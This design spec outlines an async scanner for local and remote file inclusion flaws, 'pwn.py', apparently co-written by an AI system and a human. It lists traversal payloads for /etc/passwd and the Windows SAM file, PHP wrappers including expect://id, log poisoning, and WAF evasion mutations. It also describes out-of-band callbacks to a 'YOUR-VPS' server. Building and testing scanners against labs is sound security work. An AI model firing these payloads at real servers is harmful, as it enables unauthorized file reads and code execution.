# LFI Scanner Rebuild — Design Spec

**Date:** 2026-09-03
**Author:** Claude (Fable 5) + Zim
**Status:** Approved

## Overview

Complete ground-up rebuild of `pwn.py` — from a basic 4-payload synchronous script into a comprehensive async LFI/RFI scanner with blind detection, WAF evasion, and multi-format reporting.

## Architecture: Phase-Based Async Scanner

```
Discovery → Parameter Fuzzing → Payload Injection → Verification → Reporting
```

Each phase feeds the next. Context from earlier phases narrows the attack surface for later phases.

## File Structure

Single file: `pwn.py` — all classes and logic, well-organized with clear separation via classes.

## Phase 1: Target Intelligence

- **Tech fingerprinting**: Detect server technology (PHP/ASP/JSP/Python/etc.) from response headers (`X-Powered-By`, `Server`), error page patterns, and cookie names. Select only relevant payloads per detected tech.
- **Parameter discovery**: Crawl found endpoints for query params, HTML form fields, AJAX/JSON endpoints. Parse HTML for `<form>` and `<input>` elements.
- **Path enumeration**: Beyond hardcoded paths — parse `robots.txt`, `sitemap.xml`, common CMS paths, directory brute-force with a built-in wordlist (100+ paths covering WordPress, Joomla, Drupal, Laravel, Django, etc.).

## Phase 2: Payload Engine

### Encoding & Bypass Matrix

| Category | Payloads |
|----------|----------|
| Raw traversal | `../../etc/passwd` (depth 1-12) |
| URL encoding | Single (`%2e%2e%2f`), double (`%252e%252e%252f`), triple |
| Null byte | `../../etc/passwd%00`, `../../etc/passwd\x00` |
| UTF-8 overlong | `..%c0%af..%c0%afetc/passwd` |
| PHP wrappers | `php://filter/convert.base64-encode/resource=` |
| PHP input | `php://input` (POST body) |
| Data wrapper | `data://text/plain;base64,SSBsb3ZlIFBIUAo=` |
| Expect wrapper | `expect://id` |
| Path truncation | Long padding strings (4096+ chars) to overflow max_path |
| Filter chain | Convert iconv/convert encoding chains for arbitrary read |
| Log poisoning | SSH username injection, User-Agent injection, Referer injection |
| Windows | `..\..\..\..\windows\system32\config\sam`, UNC paths |
| IIS | `..;` path segment, `/` vs `\` variants |
| Tomcat | `..;/` traversal, WAR deployment paths |
| Null variants | `%00`, `;.php`, `%0a`, `%0d` |

### Context-Aware Selection

Payload engine only fires payloads relevant to the detected technology:
- PHP detected → PHP wrappers, filter chains, log poisoning
- IIS/Windows → backslash traversal, UNC paths, `..;` variants
- Tomcat → `..;/`, WAR paths
- Apache → path info tricks, `.htaccess` read
- Generic → raw traversal, encoding bypasses (always tested)

## Phase 3: Detection Methods

### 1. Content-Based Detection
- Keyword matching against file signatures (`root:`, `<!DOCTYPE>`, `win.ini` markers)
- Base64 decode pipeline: if `php://filter` payload used, decode response and check
- Response normalization: strip HTML/CSS/JS, compare content hash to baseline
- Smart false-positive reduction: check response length delta from baseline, status code changes

### 2. Time-Based Blind Detection
- Inject timing payloads: `sleep(5)`, `benchmark(10000000,sha1('test'))`
- Statistical analysis: send N requests, measure median response time
- Configurable threshold (default: 3x baseline latency = confirmed)
- False positive mitigation: jitter, multiple rounds, control requests

### 3. Out-of-Band (OOB) Detection
- User provides callback server URL (e.g., `http://YOUR-VPS:9999`)
- Inject payloads that trigger outbound HTTP/DNS from target to callback
- Examples: PHP `file_get_contents("http://callback/payload")`, Java SSRF, Python urllib
- Listen for callback hits to confirm vulnerability
- Collaborator-style polling with timeout

### 4. Error-Based Detection
- Trigger PHP warnings (`Warning: include() failed opening`)
- Parse error messages for leaked path information
- MySQL/MSSQL error-based for SQL-LFI hybrids

## Phase 4: WAF Evasion

- **Detection**: Identify WAF from response headers (`X-WAF-*`, `X-CDN-*`, server headers), known signatures (Cloudflare, ModSecurity, Akamai, AWS WAF, Imperva), 403/406 patterns on known payloads
- **Evasion mutations** (applied when WAF detected):
  - Encode all payloads through bypass matrix
  - Chunked transfer encoding
  - Parameter pollution (`?file=safe&file=../../etc/passwd`)
  - Case randomization
  - Path separator variants (`/`, `\`, `//`, `\\/`)
  - Comment injection (`..;/../`, `.../`, `..%2f`)

## Phase 5: Reporting

### Terminal (Rich)
- Scan banner with target info
- Real-time progress per phase
- Findings table: URL, parameter, payload, vuln type, severity, evidence snippet
- Summary panel: total findings, by severity, scan duration, requests sent

### JSON
- Full structured output: metadata (target, timestamp, duration), phases completed, all findings with raw request/response data
- Designed for piping to other tools (`jq`, custom analyzers`)

### CSV
- Flat table: target, parameter, payload, vuln_type, severity, evidence, timestamp

### HTML
- Self-contained single-file report with embedded CSS
- Sortable findings table (via `<script>` or `<details>`)
- Severity color coding (Critical/High/Medium/Low)
- Copy-to-clipboard for individual payloads

## CLI Interface

```
usage: pwn.py [-h] -u URL [--proxy PROXY] [--cookie COOKIE]
              [--auth USER:PASS] [--timeout SECS] [--delay SECS]
              [--threads N] [--output FILE] [--format FORMAT]
              [--blind-timeout SECS] [--oob-server URL]
              [--waf-bypass] [--verbose] [--quick] [--crawl-depth N]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-u, --url` | Target URL (required) | — |
| `--proxy` | HTTP/SOCKS proxy | None |
| `--cookie` | Cookie header value | None |
| `--auth` | Basic auth (user:pass) | None |
| `--timeout` | Request timeout (secs) | 10 |
| `--delay` | Delay between requests (secs) | 0 |
| `--threads` | Max concurrent requests | 20 |
| `--output` | Output file path | stdout |
| `--format` | Output format (json/csv/html/terminal) | terminal |
| `--blind-timeout` | Time-based detection timeout | 15 |
| `--oob-server` | OOB callback server URL | None |
| `--waf-bypass` | Enable WAF evasion mutations | off |
| `--verbose` | Verbose output | off |
| `--quick` | Quick scan (reduced payloads) | off |
| `--crawl-depth` | Crawl depth for discovery | 2 |

## Tech Stack

- **aiohttp** — async HTTP client
- **asyncio** — concurrency orchestration
- **rich** — terminal UI
- **argparse** — CLI (stdlib)
- **pathlib** — file paths (stdlib)
- **json/csv** — output (stdlib)

## Dependencies

```
aiohttp
rich
```

## Testing

- Manual testing against known-vulnerable targets (DVWA, LFI labs)
- Unit test payload generation and encoding functions
- Integration test with mock HTTP server returning predictable responses
